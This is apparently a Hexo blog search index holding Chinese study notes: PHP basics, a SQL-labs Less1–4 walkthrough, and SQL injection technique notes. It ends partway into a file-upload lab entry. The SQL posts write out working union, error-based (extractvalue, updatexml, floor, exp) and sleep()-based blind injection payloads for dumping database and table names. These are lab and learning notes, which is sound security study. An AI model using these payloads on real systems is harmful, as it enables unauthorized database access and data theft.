<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PHP</title>
      <link href="/2025/01/26/PHP/"/>
      <url>/2025/01/26/PHP/</url>
      
        <content type="html"><![CDATA[<h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><?php// PHP 代码;?><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><p>规则：<br>变量以 $ 符号开始<br>变量名必须以字母或者下划线字符开始<br>变量名不能包含空格<br>变量名是区分大小写的</p><h4 id="PHP-NULL-值"><a href="#PHP-NULL-值" class="headerlink" title="PHP NULL 值"></a>PHP NULL 值</h4><p>NULL 值表示变量没有值。NULL 是数据类型为 NULL 的值。<br>NULL 值指明一个变量是否为空值。 同样可用于数据空值和NULL值的区别。<br>可以通过设置变量值为 NULL 来清空变量数据</p><h4 id="PHP-资源类型"><a href="#PHP-资源类型" class="headerlink" title="PHP 资源类型"></a>PHP 资源类型</h4><p>PHP 资源 resource 是一种特殊变量，保存了到外部资源的一个引用。<br>常见资源数据类型有打开文件、数据库连接、图形画布区域等。<br>由于资源类型变量保存有为打开文件、数据库连接、图形画布区域等的特殊句柄，因此将其它类型的值转换为资源没有意义。</p><h4 id="PHP-类型比较"><a href="#PHP-类型比较" class="headerlink" title="PHP 类型比较"></a>PHP 类型比较</h4><p>虽然 PHP 是弱类型语言，但也需要明白变量类型及它们的意义，因为我们经常需要对 PHP 变量进行比较，包含松散和严格比较。<br>松散比较：使用两个等号 &#x3D;&#x3D; 比较，只比较值，不比较类型。<br>严格比较：用三个等号 &#x3D;&#x3D;&#x3D; 比较，除了比较值，也比较类型。</p><h4 id="PHP常量"><a href="#PHP常量" class="headerlink" title="PHP常量"></a>PHP常量</h4><h5 id="设置-PHP-常量"><a href="#设置-PHP-常量" class="headerlink" title="设置 PHP 常量"></a>设置 PHP 常量</h5><p>设置常量，使用 define() 函数。<br>bool define ( string $name , mixed $value [, bool $case_insensitive &#x3D; false ] )<br>该函数有三个参数:<br>name：必选参数，常量名称，即标志符。<br>value：必选参数，常量的值。<br>case_insensitive ：可选参数，如果设置为 TRUE，该常量则大小写不敏感，默认是大小写敏感的</p><h5 id="预定义常量"><a href="#预定义常量" class="headerlink" title="预定义常量"></a>预定义常量</h5><p>PHP 提供了一些预定义常量，可以在脚本中直接使用。这些常量通常用于获取 PHP 的配置信息、版本信息等。常见的预定义常量有：<br>PHP_VERSION：当前 PHP 解析器的版本。<br>PHP_OS：服务器的操作系统。<br>PHP_INT_MAX：最大的整数值。<br>E_ERROR、E_WARNING、E_PARSE 等：错误报告级别。</p><h4 id="PHP字符串变量"><a href="#PHP字符串变量" class="headerlink" title="PHP字符串变量"></a>PHP字符串变量</h4><p>PHP 中的字符串变量<br>字符串变量用于包含有字符的值。<br>在创建字符串之后，我们就可以对它进行操作了。可以直接在函数中使用字符串，或者把它存储在变量中。</p><h4 id="PHP-并置运算符"><a href="#PHP-并置运算符" class="headerlink" title="PHP 并置运算符"></a>PHP 并置运算符</h4><p>在 PHP 中，只有一个字符串运算符。<br>并置运算符 (.) 用于把两个字符串值连接起来。</p><h4 id="PHP-strlen-函数"><a href="#PHP-strlen-函数" class="headerlink" title="PHP strlen() 函数"></a>PHP strlen() 函数</h4><p>有时知道字符串值的长度是很有用的。<br>strlen() 函数返回字符串的长度（字节数）。</p><h4 id="PHP-strpos-函数"><a href="#PHP-strpos-函数" class="headerlink" title="PHP strpos() 函数"></a>PHP strpos() 函数</h4><p>strpos() 函数用于在字符串内查找一个字符或一段指定的文本。<br>如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。</p><h4 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h4><p>(expr1) ? (expr2) : (expr3)<br>对 expr1 求值为 TRUE 时的值为 expr2，在 expr1 求值为 FALSE 时的值为 expr3。<br>组合比较符(PHP7+)<br>PHP7+ 支持组合比较符（combined comparison operator）也称之为太空船操作符，符号为 &lt;&#x3D;&gt;。组合比较运算符可以轻松实现两个变量的比较，当然不仅限于数值类数据的比较。<br>$c &#x3D; $a &lt;&#x3D;&gt; $b;<br>解析如下：<br>如果 $a &gt; $b, 则 $c 的值为 1。<br>如果 $a &#x3D;&#x3D; $b, 则 $c 的值为 0。<br>如果 $a &lt; $b, 则 $c 的值为 -1。</p><h4 id="括号的使用"><a href="#括号的使用" class="headerlink" title="括号的使用"></a>括号的使用</h4><p>我们通过括号的配对来明确标明运算顺序，而非靠运算符优先级和结合性来决定，通常能够增加代码的可读性。</p><h4 id="PHP条件语句"><a href="#PHP条件语句" class="headerlink" title="PHP条件语句"></a>PHP条件语句</h4><h5 id="if-语句-在条件成立时执行代码"><a href="#if-语句-在条件成立时执行代码" class="headerlink" title="if 语句 - 在条件成立时执行代码"></a>if 语句 - 在条件成立时执行代码</h5><h5 id="if…else-语句-在条件成立时执行一块代码，条件不成立时执行另一块代码"><a href="#if…else-语句-在条件成立时执行一块代码，条件不成立时执行另一块代码" class="headerlink" title="if…else 语句 - 在条件成立时执行一块代码，条件不成立时执行另一块代码"></a>if…else 语句 - 在条件成立时执行一块代码，条件不成立时执行另一块代码</h5><h5 id="if…elseif…-else-语句-在若干条件之一成立时执行一个代码块"><a href="#if…elseif…-else-语句-在若干条件之一成立时执行一个代码块" class="headerlink" title="if…elseif….else 语句 - 在若干条件之一成立时执行一个代码块"></a>if…elseif….else 语句 - 在若干条件之一成立时执行一个代码块</h5><h5 id="switch-语句-在若干条件之一成立时执行一个代码块"><a href="#switch-语句-在若干条件之一成立时执行一个代码块" class="headerlink" title="switch 语句 - 在若干条件之一成立时执行一个代码块"></a>switch 语句 - 在若干条件之一成立时执行一个代码块</h5><h5 id="PHP-Switch-语句"><a href="#PHP-Switch-语句" class="headerlink" title="PHP Switch 语句"></a>PHP Switch 语句</h5><?phpswitch (expression) {    case value1:        // 代码块1        break;    case value2:        // 代码块2        break;    // 更多的 case 语句    default:        // 如果没有匹配的值}?><p>expression 是要被比较的表达式。<br>case value: 是可能的值，如果 expression 的值等于某个 case 的值，就执行相应的代码块。<br>break; 用于终止 switch 语句，防止继续执行下一个 case。<br>default: 是可选的，用于指定当没有匹配的 case 时执行的代码块。</p><h3 id="PHP数组"><a href="#PHP数组" class="headerlink" title="PHP数组"></a>PHP数组</h3><p>在 PHP 中创建数组<br>array() 函数<br>在 PHP 中，有三种类型的数组：<br>数值数组 - 带有数字 ID 键的数组<br>关联数组 - 带有指定的键的数组，每个键关联一个值<br>多维数组 - 包含一个或多个数组的数组</p><h4 id="PHP-数值数组"><a href="#PHP-数值数组" class="headerlink" title="PHP 数值数组"></a>PHP 数值数组</h4><p>有两种创建数值数组的方法：<br>自动分配 ID 键（ID 键总是从 0 开始）：<br>$cars&#x3D;array(“Volvo”,”BMW”,”Toyota”);<br>人工分配 ID 键：<br>$cars[0]&#x3D;”Volvo”;<br>$cars[1]&#x3D;”BMW”;<br>$cars[2]&#x3D;”Toyota”;<br>获取数组的长度 - count() 函数<br>count() 函数用于返回数组的长度（元素的数量）<br>遍历数值数组<br>遍历并打印数值数组中的所有值，可以使用 for 循环</p><h4 id="PHP-关联数组"><a href="#PHP-关联数组" class="headerlink" title="PHP 关联数组"></a>PHP 关联数组</h4><p>关联数组是使用您分配给数组的指定的键的数组。<br>有两种创建关联数组的方法：<br>$age&#x3D;array(“Peter”&#x3D;&gt;”35”,”Ben”&#x3D;&gt;”37”,”Joe”&#x3D;&gt;”43”);<br>or:<br>$age[‘Peter’]&#x3D;”35”;<br>$age[‘Ben’]&#x3D;”37”;<br>$age[‘Joe’]&#x3D;”43”;<br>随后可以在脚本中使用指定的键<br>遍历关联数组<br>遍历并打印关联数组中的所有值，可以使用 foreach 循环</p><h3 id="PHP-数组排序"><a href="#PHP-数组排序" class="headerlink" title="PHP 数组排序"></a>PHP 数组排序</h3><p>数组中的元素可以按字母或数字顺序进行降序或升序排列。<br>PHP - 数组排序函数<br>sort() - 对数组进行升序排列<br>rsort() - 对数组进行降序排列<br>asort() - 根据数组的值，对数组进行升序排列<br>ksort() - 根据数组的键，对数组进行升序排列<br>arsort() - 根据数组的值，对数组进行降序排列<br>krsort() - 根据数组的键，对数组进行降序排列</p><h3 id="PHP-超级全局变量"><a href="#PHP-超级全局变量" class="headerlink" title="PHP 超级全局变量"></a>PHP 超级全局变量</h3><p>PHP中预定义了几个超级全局变量（superglobals） ，这意味着它们在一个脚本的全部作用域中都可用。 你不需要特别说明，就可以在函数及类中使用。<br>PHP $GLOBALS<br>$GLOBALS 是一个包含了全部变量的全局组合数组。变量的名字就是数组的键。<br>PHP $_SERVER<br>$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。<br>PHP $_REQUEST<br>PHP $_REQUEST 用于收集HTML表单提交的数据。<br>PHP $_POST<br>PHP $_POST 被广泛应用于收集表单数据，在HTML form标签的指定该属性：”method&#x3D;”post”。<br>PHP $_GET<br>PHP $_GET 同样被广泛应用于收集表单数据，在HTML form标签的指定该属性：”method&#x3D;”get”。<br>$<em>GET 也可以收集URL中发送的数据。</em></p><h3 id="PHP-表单和用户输入"><a href="#PHP-表单和用户输入" class="headerlink" title="PHP 表单和用户输入"></a>PHP 表单和用户输入</h3><p>PHP 中的 $_GET 和 $_POST 变量用于检索表单中的信息，比如用户输入。</p><h3 id="php判断字符串中是否包含指定字符串"><a href="#php判断字符串中是否包含指定字符串" class="headerlink" title="php判断字符串中是否包含指定字符串"></a>php判断字符串中是否包含指定字符串</h3><p>strpos<br>$a &#x3D; ‘How are you?’;<br>if (strpos($a, ‘are’) !&#x3D;&#x3D; false) {<br> echo ‘true’;<br>} else {<br>echo ‘false’;<br>}<br>注意这里一定要使用 !&#x3D;&#x3D; false 来做判断条件语句， strpos() 如果没有找到字符串则返回 FALSE</p><h3 id="PHP文件处理"><a href="#PHP文件处理" class="headerlink" title="PHP文件处理"></a>PHP文件处理</h3><h4 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h4><p>fopen() 函数用于在 PHP 中打开文件。<br>此函数的第一个参数含有要打开的文件的名称，第二个参数规定了使用哪种模式来打开文件：$file&#x3D;fopen(“welcome.txt”,”r”);</p><h4 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h4><p>fclose() 函数用于关闭打开的文件：<br>fclose($file);</p><h4 id="检测文件末尾（EOF）"><a href="#检测文件末尾（EOF）" class="headerlink" title="检测文件末尾（EOF）"></a>检测文件末尾（EOF）</h4><p>feof() 函数检测是否已到达文件末尾（EOF）。<br>在循环遍历未知长度的数据时，feof() 函数很有用。<br>注释：在 w 、a 和 x 模式下，您无法读取打开的文件！<br>if (feof($file)) echo “文件结尾”;</p><h4 id="逐行读取文件"><a href="#逐行读取文件" class="headerlink" title="逐行读取文件"></a>逐行读取文件</h4><p>fgets() 函数用于从文件中逐行读取文件。<br>注释：在调用该函数之后，文件指针会移动到下一行。<br>while(!feof($file))<br>{<br>    echo fgets($file). “<br>“;<br>}</p><h4 id="逐字符读取文件"><a href="#逐字符读取文件" class="headerlink" title="逐字符读取文件"></a>逐字符读取文件</h4><p>fgetc() 函数用于从文件中逐字符地读取文件。<br>注释：在调用该函数之后，文件指针会移动到下一个字符。<br>while (!feof($file))<br>{<br>    echo fgetc($file);<br>}<br><code>PHP 文件上传</code><br><code>创建一个文件上传表单</code></p><p><code>&lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; </code><br>    <code>&lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt; </code><br>   <code> &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</code><br><code>&lt;/form&gt;</code></p><p><code>&lt;form&gt; 标签的 enctype 属性规定了在提交表单时要使用哪种内容类型。在表单需要二进制数据时，比如文件内容，请使用 &quot;multipart/form-data&quot;。</code><br><code>&lt;input&gt; 标签的 type=&quot;file&quot; 属性规定了应该把输入作为文件来处理。举例来说，当在浏览器中预览时，会看到输入框旁边有一个浏览按钮。</code></p><h3 id="PHP-Cookie"><a href="#PHP-Cookie" class="headerlink" title="PHP Cookie"></a>PHP Cookie</h3><p>cookie 常用于识别用户。</p><h4 id="如何创建-Cookie？"><a href="#如何创建-Cookie？" class="headerlink" title="如何创建 Cookie？"></a>如何创建 Cookie？</h4><p>setcookie() 函数用于设置 cookie。<br>注释：setcookie() 函数必须位于 <html> 标签之前。<br>语法<br>setcookie(name, value, expire, path, domain);</p><h4 id="如何取回-Cookie-的值？"><a href="#如何取回-Cookie-的值？" class="headerlink" title="如何取回 Cookie 的值？"></a>如何取回 Cookie 的值？</h4><p>PHP 的 $_COOKIE 变量用于取回 cookie 的值。<br>echo $_COOKIE[“user”];<br>使用 isset() 函数来确认是否已设置了 cookie</p><h4 id="如何删除-Cookie？"><a href="#如何删除-Cookie？" class="headerlink" title="如何删除 Cookie？"></a>如何删除 Cookie？</h4><p>当删除 cookie 时，您应当使过期日期变更为过去的时间点。<br>setcookie(“user”, “”, time()-3600);</p><h3 id="PHP-Session"><a href="#PHP-Session" class="headerlink" title="PHP Session"></a>PHP Session</h3><p>PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。</p><h4 id="开启Session"><a href="#开启Session" class="headerlink" title="开启Session"></a>开启Session</h4><?php session_start(); ?><h4 id="使用Session"><a href="#使用Session" class="headerlink" title="使用Session"></a>使用Session</h4><p><strong>存储Session数据</strong></p><p>$SESSION 超全局数组<br>$_SESSION[‘user_id’] &#x3D; 123;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`echo $_SESSION[&#x27;user_id&#x27;];`</span><br></pre></td></tr></table></figure><p><strong>读取 Session 数据</strong></p><p><strong>删除Session数据</strong></p><p>unset() 函数用于释放指定的 session 变量：<br>unset($_SESSION[‘user_id’]);</p><p><strong>销毁 Session</strong></p><p>session_destroy() 函数彻底销毁 session</p><h3 id="PHP-连接-MySQL"><a href="#PHP-连接-MySQL" class="headerlink" title="PHP 连接 MySQL"></a>PHP 连接 MySQL</h3><p>先连接到数据库服务器</p><h4 id="MySQLi-面向对象"><a href="#MySQLi-面向对象" class="headerlink" title="MySQLi - 面向对象"></a>MySQLi - 面向对象</h4><p>&#x2F;&#x2F; 创建连接<br> $conn &#x3D; new mysqli($servername, $username, $password);<br> &#x2F;&#x2F; 检测连接 if ($conn-&gt;connect_error) {<br>die(“连接失败: “ . $conn-&gt;connect_error);<br> }<br>echo “连接成功”;</p><h4 id="MySQLi-面向过程"><a href="#MySQLi-面向过程" class="headerlink" title="MySQLi - 面向过程"></a>MySQLi - 面向过程</h4><p>&#x2F;&#x2F; 创建连接<br> $conn &#x3D; mysqli_connect($servername, $username, $password);<br> &#x2F;&#x2F; 检测连接<br> if (!$conn) {<br>    die(“Connection failed: “ . mysqli_connect_error());<br>}<br>echo “连接成功”;</p><h3 id="PHP-MySQL-创建数据库"><a href="#PHP-MySQL-创建数据库" class="headerlink" title="PHP MySQL 创建数据库"></a>PHP MySQL 创建数据库</h3><p>CREATE DATABASE 语句<br>&#x2F;&#x2F; 创建数据库<br>$sql &#x3D; “CREATE DATABASE myDB”;<br> if ($conn-&gt;query($sql) &#x3D;&#x3D;&#x3D; TRUE) {<br>     echo “数据库创建成功”;<br> } else {<br>    echo “Error creating database: “ . $conn-&gt;error;<br>    }&#96;</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL-labs</title>
      <link href="/2025/01/24/SQL-labs/"/>
      <url>/2025/01/24/SQL-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h1><p>尝试?id&#x3D;1</p><p>?id&#x3D;1‘ 报错</p><p>?id&#x3D;1’–+正常（<code>+</code>URL解码为空格）</p><p>说明可以用注释符绕过</p><p>判断字段数</p><p>?id&#x3D;1’ order by 3–+正常</p><p>union注入</p><p>?id&#x3D;-1’ union select 1,2,3–+</p><p><img src="https://raw.githubusercontent.com/xdzjldy/1/main/image-20250124220655725.png"></p><p>爆库名</p><p>?id&#x3D;1’ and 1&#x3D;2 union select 1,2,group_concat(schema_name) from information_schema.schemata–+</p><p><img src="https://raw.githubusercontent.com/xdzjldy/1/main/image-20250125171516521.png"></p><p>爆表名</p><p>?id&#x3D;1’ and 1&#x3D;2 union select 1,2,group_concat(table_name) from information_schema.tables–+</p><p><img src="https://raw.githubusercontent.com/xdzjldy/1/main/image-20250125171816251.png"></p><p>?id&#x3D;1’ and 1&#x3D;2 union select 1,2,group_concat(flag) from ctftraining.flag–+</p><h1 id="Less2"><a href="#Less2" class="headerlink" title="Less2"></a>Less2</h1><p>?id&#x3D;1”报错，说明参数未被引号包裹，判断是数字型</p><p>?id&#x3D;1 –+正常</p><p>判断字段数</p><p>?id&#x3D;1 order by 3–+正常</p><p>union注入</p><p>爆库名</p><p>?id&#x3D;1 and 1&#x3D;2 union select 1,2,group_concat(schema_name) from information_schema.schemata–+</p><p>爆表名</p><p>?id&#x3D;1 and 1&#x3D;2 union select 1,2,group_concat(table_name) from information_schema.tables–+</p><p>?id&#x3D;1 and 1&#x3D;2 union select 1,2,group_concat(flag) from ctftraining.flag–+</p><h1 id="Less3"><a href="#Less3" class="headerlink" title="Less3"></a>Less3</h1><p>?id&#x3D;1”正常，参数可能被引号包裹</p><p>?id&#x3D;;&#x2F;‘;[]’强制触发数据库的语法错误，从错误信息中提取关键字符，推断闭合方式</p><p><img src="https://raw.githubusercontent.com/xdzjldy/1/main/image-20250125174724985.png"></p><p>可能的SQL语句</p><p>SELECT * FROM table WHERE id&#x3D;(‘1’) LIMIT 0,1</p><p>SELECT * FROM table WHERE id&#x3D;(‘;&#x2F;‘;[]’’) LIMIT 0,1</p><p>?id&#x3D;1’) order by 3–+正常</p><p>union注入</p><p>剩余步骤同Less1、Less2</p><h1 id="Less4"><a href="#Less4" class="headerlink" title="Less4"></a>Less4</h1><p>?id&#x3D;1”报错</p><p><img src="https://raw.githubusercontent.com/xdzjldy/1/main/image-20250126151822886.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL绕过</title>
      <link href="/2025/01/24/SQL%E7%BB%95%E8%BF%87/"/>
      <url>/2025/01/24/SQL%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞的类型"><a href="#漏洞的类型" class="headerlink" title="漏洞的类型"></a>漏洞的类型</h1><h2 id="SQL注入的具体判断流程："><a href="#SQL注入的具体判断流程：" class="headerlink" title="SQL注入的具体判断流程："></a>SQL注入的具体判断流程：</h2><p>1.注入点测试：</p><p>测试交互方式，判断浏览器<strong>提交数据</strong>和web浏览器的<strong>交互方式</strong>。</p><p>2.判断字符的类型：<strong>整数型还是字符型</strong></p><p>3.构造闭合：（字符型需要，整型不需要）</p><p>4.查询字段数：构造SQL语句并判断数据库表的行数</p><p>5.判断回显位：构造SQL语句，找到数据库回显的位置</p><p>6.查询数据库的基本信息：数据库名字、版本</p><p>7.爆数据库的敏感信息：数据库表名、字段名（列名）、字符中的数据</p><h2 id="普通查询注入"><a href="#普通查询注入" class="headerlink" title="普通查询注入"></a>普通查询注入</h2><h3 id="判断漏洞是否存在"><a href="#判断漏洞是否存在" class="headerlink" title="判断漏洞是否存在"></a>判断漏洞是否存在</h3><p><strong>union注入（整型和字符型）</strong></p><h4 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h4><p>例如后端SQL语句：</p><p><code>select * from article where artid = 1 and xxxxx;</code></p><p>可以在参数值后面输入单引号，此时数据库无法执行就会报错，说明存在SQL注入</p><p>?id&#x3D;1’</p><p>#select * from article where id &#x3D; 1’ and xxxx;</p><p>通过and 1&#x3D;1 ，and 1&#x3D;2 判断</p><p>?id&#x3D;1 and 1&#x3D;1<br>?id&#x3D;2 and 1&#x3D;2</p><p>#select * from article where id &#x3D; 1 and 1&#x3D;1 and xxxx;</p><p>#若and 1&#x3D;1页面回显正常，and 1&#x3D;2 回显不正常 ，则说明拼接成功</p><p>注意：在测试删除功能时尽量不要使用<code>and 1=1</code>，否则可能会将数据全部删除</p><h4 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h4><p>与数字型类似，注意单引号&#x2F;双引号&#x2F;括号的闭合，可以在最后加上注释符把后面的闭合符号和语句直接注释掉</p><h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3><p>?id&#x3D;1 order by 4</p><p># 遍历数字，页面内容回显正常说明列数正确</p><p>order by 无法使用时，可以通过SELECT NULL判断</p><p>?id&#x3D;1 SELECT NULL, NULL, NULL, NULL</p><h3 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h3><p>?id&#x3D;-1 union select 1, database(), 3, 4</p><h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><p>?id&#x3D;-1 union select 1,group_concat(table_name), 3, 4 from information_schema.tables where table_schema&#x3D;xxx</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>报错常用的函数</p><h4 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h4><p>id&#x3D;1 and select count(<code>*</code>),floor(rand(0)<code>*</code>2) x from xxx group by x;</p><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h4><p>id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</p><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h4><p>id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>id&#x3D;1 and exp(~(select * from(select user())a));</p><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h4 id="Boolean盲注"><a href="#Boolean盲注" class="headerlink" title="Boolean盲注"></a>Boolean盲注</h4><p>盲注常用的函数</p><p>length() # 返回字符串的长度<br>substr() # 截取字符串 （语法:SUBSTR(str,pos,len)）<br>ascii() # 返回字符的ascii码   [将字符变为数字wei]<br>sleep() # 将程序挂起一段时间n为n秒<br>if(expr1,expr2,expr3) # 判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</p><p><strong>注入步骤</strong></p><p>1.判断数据库名字的长度</p><p>?id&#x3D;1 and length(database()) &gt; 7</p><p>2.猜解数据库名</p><p>?id&#x3D;1 and substr(database(), 1, 1) &#x3D; ‘s’</p><p>可以使用burp或者python脚本进行遍历猜解</p><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p><strong>注入方法</strong></p><p>1.判断注入点</p><p>根据页面回显判断</p><p>1” and 1&#x3D;1– # 页面返回有数据<br>1” and 2&#x3D;2– # 页面返回有数据</p><p>用sleep()判断，如果响应延时了5s说明存在时间盲注</p><p>“ and sleep(5)–</p><p>2.猜解当前数据库名称长度</p><p>“ and if((length(database()))&#x3D;12,sleep(5),1)–</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入漏洞</title>
      <link href="/2025/01/24/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/01/24/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h1><h2 id="1-原理："><a href="#1-原理：" class="headerlink" title="1.原理："></a>1.原理：</h2><p>1参数用户可控：前端传给后端的参数内容是用户可以控制的。</p><p>2参数带入数据库查询：传入的参数拼接到SQL语句，且带入数据库查询。</p><h2 id="2-基础SQL语句："><a href="#2-基础SQL语句：" class="headerlink" title="2.基础SQL语句："></a>2.基础SQL语句：</h2><p><strong>select  column_name  from  tables_name</strong></p><p> 在表tables_name中查询字段column_name</p><p><strong>select  column_name  from  tables_name  where  已知字段名&#x3D;已知的条件</strong></p><p>在已知的条件下，在表tables_name中查询字段column_name</p><h2 id="3-information-schema"><a href="#3-information-schema" class="headerlink" title="3.information_schema"></a>3.information_schema</h2><p>MySQL 5.0版本之后，MySQL默认在数据库中存放一个“information_schema”的数据库，在该库中，需要记住三个表名，分别是：<strong>schemata</strong>、<strong>tables</strong>、<strong>columns</strong>。</p><p>1.schemata表存储该用户创建的所有数据库的库名。</p><p>   <strong>数据库库名的字段名为</strong>：<strong>schemata_name</strong></p><p>2.tables表存储该用户创建的所有数据库的库名和表名。</p><p><strong>数据库库名</strong>和<strong>表名的字段名分别是</strong>：<strong>tables_schema</strong>和<strong>table_name</strong>。</p><p>3.columns表存储该用户创建的所有数据库的库名、表名和字段名。</p><p><strong>数据库库名、表名和字段名的字段名分别是</strong>：<strong>tables_schema</strong>、<strong>table_name</strong>和<strong>column_name</strong>。</p><p>   <strong>information_schema.tables：数据库的表名</strong></p><p>   <strong>information_schema.columns：数据库的列名</strong></p><img src="https://raw.githubusercontent.com/xdzjldy/1/main/%E5%9B%BE%E7%89%871.png" style="zoom:50%;" /><h2 id="4-limit的用法"><a href="#4-limit的用法" class="headerlink" title="4.limit的用法"></a>4.limit的用法</h2><p>limit子句是用于限制查询结果返回的数量，常用于分页查询。也就是SQL查询出来的结果集，按照升序排列，由小到大排列。</p><p><strong>语法：limit m，n</strong></p><p>参数：m：是指记录开始的位置，从0开始，表示第一条记录</p><p>​            n：是指取n条记录</p><p>例如：limit 0,1 的含义说就是表示从第一条记录开始，表示取最上面0到1之间的记录，即为第一条记录，取一条记录。</p><h2 id="5-注释符："><a href="#5-注释符：" class="headerlink" title="5.注释符："></a>5.注释符：</h2><p><strong># ……</strong> ：#号后面的都会被注释</p><p> <strong>– ……</strong> ：–号后面的都会被注释，不过在 – 的前后都需要加空格再加数据</p><p> <strong>&#x2F;* … *&#x2F;</strong> ：内联注释，内联注释可以用于整个SQL语句中，用来执行SQL语句。</p><p>   例如：index?id&#x3D;-10 &#x2F;<em>!union</em>&#x2F; &#x2F;<em>!select</em>&#x2F; 1,2,3</p><h2 id="6-SQL注入常规命令查询："><a href="#6-SQL注入常规命令查询：" class="headerlink" title="6.SQL注入常规命令查询："></a>6.SQL注入常规命令查询：</h2><p><strong>id&#x3D;1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’数据库名称’   &#x2F;&#x2F;查表名</strong></p><p><strong>id&#x3D;1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’表名称’  &#x2F;&#x2F;查字段名（列名）</strong></p><p><strong>id&#x3D;1 union select 1,2,字段名 from 表名  &#x2F;&#x2F;查详细信息</strong></p><h2 id="7-SQL注入中常用的函数及命令："><a href="#7-SQL注入中常用的函数及命令：" class="headerlink" title="7.SQL注入中常用的函数及命令："></a>7.SQL注入中常用的函数及命令：</h2><p>1.<strong>union：union操作符用于合并两个或者多个select语句的结果集。</strong></p><p>语法：<strong>select column_name from table_name1 union select column_name from table_name2</strong></p><p>注意：union内部的select语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条select语句中的列的顺序必须是相同的。</p><p>2.<strong>order by：order by关键字用于对结果集按照一个列或者多个列进行排序，默认升序。</strong></p><p>语法：<strong>order by column_name</strong></p><p>注意：order by语句是默认按照升序对记录进行排序，如果希望按照降序对记录进行排序，也可以使用desc关键字（order by被正则过滤掉的话，是可以用desc来进行判断字段）</p><p>例如：order by 1或者order by 2中其实1表示第一个栏位，2表示第二个栏位。如果当表中只有两个字段列时，order by 3就会报错，就是通过这种方式来判断字段数。</p><p>3.<strong>concat：将多个字符串连接成一个字符串。</strong></p><p>语法：<strong>concat(str1，str2)</strong></p><p>注意：返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</p><p>4.<strong>group_concat()函数：该函数返回带有来自一个组的连接的非NULL值的字符串结果。</strong></p><p><strong>功能：将group by产生的同一个分组中的值连接起来，返回一个字符串的结果。</strong></p><p>语法：<strong>group_concat( [distinct]  要连接的字段</strong>  [order by 排序字段 asc&#x2F;desc] [separator ‘分隔符’])</p><p>说明：distinct可以排除重复值，order by子句可以对结果中的值进行跑徐，separator是一个字符串值，缺省为一个逗号。</p><p><strong>（以id分组，把name字段的值打印在一行。）</strong></p><p><strong>group by语句：用于结合合计函数，根据一个或多个列队结果集进行分组。</strong></p><p>gourp by x：是会根据x的规则队数据进行分组，而分组的时候，MySQL会建立一个临时空表来进行分组。</p><p>5.<strong>substr()函数：用来截取数据库某个字段中的一部分。</strong></p><p>语法：substr(string，start，length)</p><p>参数：string：必选，数据库中需要截取的字段</p><p>​            start：必选。正数，从字符串指定位置开始截取；负数，从字符串结尾指定位置开始 截取；0，在字符串中第一个位置开始截取。</p><p>​            length：可选，需要截取的长度。即截取到结束位置</p><p>6.<strong>ascii()函数：返回字符串str的最左边的数值。</strong></p><p>语法：ascii(str)</p><p>7.<strong>database()：当前使用的数据库。</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞靶场</title>
      <link href="/2025/01/22/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/"/>
